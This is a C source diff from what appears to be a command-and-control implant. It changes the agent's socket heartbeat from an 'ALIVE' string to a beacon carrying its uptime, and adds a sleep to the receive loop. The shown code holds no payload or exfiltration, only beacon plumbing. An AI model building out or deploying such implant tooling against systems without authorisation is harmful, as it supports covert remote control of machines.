@@ -5,6 +5,7 @@
 #include <pthread.h>
 
 #include <sys/socket.h>
+#include <arpa/inet.h>
 
 #include "utility.h"
 #include "implant.h"
@@ -20,6 +21,8 @@ extern pthread_mutex_t agent_receive_queue_lock;
 // Send Queue
 extern struct Queue* agent_send_queue;
 extern pthread_mutex_t agent_send_queue_lock;
+// Start time
+extern time_t start_time;
 
 void *agent_receive(void *vargp){
 	int *sockfd = (int*)vargp;
@@ -27,6 +30,7 @@ void *agent_receive(void *vargp){
 	char* buffer;
 	
 	for (;;){
+		sleep(1);
 		uint message_size = 0;
 		uint bytes_received = 0;
 		
@@ -55,7 +59,6 @@ void *agent_receive(void *vargp){
 }
 
 void *agent_send(void *vargp){
-	char *alive = "ALIVE\n";
 	int *sockfd = (int*)vargp;
 	uint message_size = 0;
 	char buf[BUFFERSIZE];
@@ -65,13 +68,14 @@ void *agent_send(void *vargp){
 	fragment.type = 0;
 	fragment.index = 0;
 	// set first 4 bytes of message to message size
-	fragment.first_payload.total_size = strlen(alive);
-	memcpy(fragment.first_payload.actual_payload, alive, strlen(alive));
+	fragment.first_payload.total_size = sizeof(fragment.first_payload.alive_time);
 	
-	// size = type (4 bytes) + index (4 bytes) + payload size (4 bytes) + "ALIVE\n"
-	message_size = sizeof(fragment.type) + sizeof(fragment.index) + sizeof(fragment.first_payload.total_size) + strlen(alive);
+	
+	// size = type (4 bytes) + index (4 bytes) + payload size (4 bytes) + alive time (4 bytes)
+	message_size = sizeof(fragment.type) + sizeof(fragment.index) + sizeof(fragment.first_payload.total_size) + sizeof(fragment.first_payload.alive_time);
 	
 	for (;;){
+		fragment.first_payload.alive_time = htonl(time(NULL) - start_time);
 		debug_print("sending fragment:\ttype: %d, index: %d, size: %d bytes\n", fragment.type, fragment.index, message_size);
 		send(*sockfd, &fragment, message_size, 0);
 		sleep(SLEEP_TIME);
